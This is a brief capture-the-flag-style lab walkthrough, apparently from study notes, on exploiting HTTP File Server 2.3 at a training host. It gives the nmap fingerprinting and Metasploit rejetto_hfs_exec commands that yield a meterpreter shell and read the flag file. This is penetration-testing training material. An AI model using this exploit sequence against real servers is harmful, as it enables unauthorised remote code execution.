# Windows: HTTP File Server

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4521–4549. Examples are lab-specific and need verification.

An HTTP File Server (HFS) is a server application that facilitates file sharing over the HTTP protocol. It allows users to upload, download, and manage files via a web interface. HFS can be used for both personal and professional purposes to share files easily over a network. In this lab, we will see how an HFS server application can be exploited.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

**Objective:** Exploit the application and retrieve the flag!

Tools: nmap , msf

```bash
nmap -Pn -A -T4 demo.ine.local
#port 80, version:HttpFileServer httpd 2.3
search HttpFileServer
use 0 or
use exploit/windows/http/rejetto_hfs_exec
show options
set rhosts demo.ine.local
run
#got meterpreter
shell
cd C:\
type flag.txt
#got the flag

```
